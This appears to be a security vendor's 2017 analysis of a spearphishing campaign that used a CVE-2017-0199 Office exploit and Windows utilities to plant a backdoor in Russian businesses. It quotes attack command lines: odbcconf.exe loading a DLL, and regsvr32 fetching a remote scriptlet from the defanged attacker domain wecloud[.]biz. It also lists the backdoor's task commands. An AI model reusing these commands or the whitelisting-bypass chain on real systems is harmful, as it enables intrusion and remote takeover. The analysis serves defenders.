Emails with Backdoor Targets Russian Businesses

August 7, 2017

A malicious email campaign against Russian-speaking enterprises is employing a
combination of exploits and Windows components to deliver a new backdoor that allows
attackers to take over the affected system. The attack abuses various legitimate Windows
components to run unauthorized scripts; this is meant to make detection and blocking more
challenging, particularly by whitelisting-based solutions.
We’ve observed at least five runs from June 23 to July 27, 2017, each of which sent several
malicious emails per target. Affected industries were financial institutions, including banks,
and mining firms. Of note is how the attackers diversified their tactic—sending different
emails for each run, per target.
The earliest sample of the malicious dynamic-link library (DLL) file related to these attacks
was uploaded to VirusTotal last June 6, 2017. This somewhat coincides with the spate of
emails we saw during the period between the last week of June and July 27, 2017.
We're inclined to think that these attacks are still ongoing. Their limited distribution and
specificity in social engineering lures are red flags that may indicate they are a spearphishing campaign.

The infection chain starts with emails with addresses designed to make it look like they're
from actual sales and billing departments. One sample we found used the subject
line, Правила подключения к шлюзу, which translates to “Rules for connecting to the
gateway.” Another has the subject line, Оплата госпошлин, which means “Payment of
state duties.”
These emails contain an attachment that takes the form of a .DOC file with various file
names. Two of the file names we’ve seen used are Инструкция для подключения
клиентов.doc (Instructions for connecting clients) and Заявление на оплату услуги
.doc (Application for payment of the service).

These files are actually a malformed Rich Text Format (RTF) file Trend Micro detects as
TROJ_EXPLOYT.JEJORC. These exploit a vulnerability (CVE-2017-0199) in Microsoft
Office’s Windows Object Linking and Embedding (OLE) interface. We’ve actually seen other
threat actors leveraging this security flaw.
The exploit code downloads what is supposedly an XLS file from
hxxps://wecloud[.]biz/m11[.]xls. This domain, to which all of the URLs used by this attack
point to, is controlled by the attacker and was registered in early July. This fake Excel
spreadsheet file is embedded with malicious JavaScript. The Excel header will actually be
ignored and the file will be treated as an HTML Application file by mshta.exe, the Windows
component that handles/opens HTA or HTML files.

Figures 5 to 6. XLS file with header and JavaScript code
The JavaScript in m11.xls contains two PowerShell scripts. The first script will download and
launch a decoy document, while the second will continue the infection chain by downloading
another file.

The file will be decrypted using AES-CBC cipher algorithm and then saved to
the %Appdata% folder with a random file name and .TXT extension. The decrypted file is a
dynamic-link library (DLL) file detected as TROJ_DROPNAKJS.ZGEG-A.

Figure 9. Decrypted file
The JavaScript code in m11.xls will then execute the file using the following command line:
odbcconf.exe /S /A {REGSVR C:\Users\Administrator\AppData\Roaming\{RANDOM}.txt}
This particular file (odbcconf.exe) is a normal executable that performs various tasks
associated with Microsoft Data Access Components. The command above misuses this
feature to execute the DLL file.
Upon execution, this DLL will drop a file in the %AppData% folder. This file is appended with
a .txt extension. This is actually an SCT file (Windows scriptlet), which is normally used to
declare variables, define expressions, and add functional codes in web pages. In this case, it
has a malicious, obfuscated JScript file (JS_NAKJS.ZIEG-A).

Figure 10. Dropped XML file showing obfuscated downloader code
The DLL will execute the SCT file using the following command: regsvr32.exe /s /n /u
/i:”C:\Users\Administrator\AppData\Roaming\{RANDOM}.txt” scroBj.dll
This particular command uses the Regsvr32 (Microsoft Register Server) command-line utility,
which is normally used to register and unregister OLE controls in the Windows registry,
including DLL files. This attack method is also known as Squiblydoo—Regsvr32 is abused to
bypass restrictions on running scripts. It also means evading application
whitelisting protections such as AppLocker. While Squiblydoo is already a known attack
vector, this is the first time we’ve seen it combined with odbcconf.exe.
The above command, once deobfuscated, will execute another XML file, which is
downloaded from hxxps://wecloud[.]biz/mail/changelog[.]txt. This file serves as the main
backdoor.

Figure 11. Constructing the command to launch the final payload
The same command format is used to launch the final payload (JS_GETFO.ZHEG-A). Note
that because of the /i switch, the code is directly gathered from a URL: regsvr32.exe /s /n /u
/i: hxxps://wecloud[.]biz/mail/changelog[.]txt scroBj.dll

3/5

This is another SCT file with obfuscated JavaScript code that contains backdoor commands,
which essentially allow attackers to take over an infected system. It attempts to connect to its
C&C server at hxxps://wecloud[.]biz/mail/ajax[.]php and retrieve tasks to carry out, some of
which are:
d&exec = download and execute PE file
gtfo = delete files/startup entries and terminate
more_eggs = download additional/new scripts
more_onion = run new script and terminate current script
more_power = run command shell commands

Mitigation
While the later stages of the infection chain required the use of various Windows
components, the entry point still involves the use of a Microsoft Office exploit. Patching and
keeping software up-to-date will protect users. Alternately, employing firewalls, intrusion
detection and prevention systems, virtual patching, and URL categorization, as well as
enforcing robust patch management policies, will significantly reduce the system’s attack
surface.
Apart from enforcing the principle of least privilege, system administrators should also
consider disabling system components that aren’t necessary to the user’s tasks. Another
option is to blacklist possible command interpreters and rarely used applications, even if they
are Windows components themselves. It should be noted that doing this could affect
legitimate system functions, but will improve security.
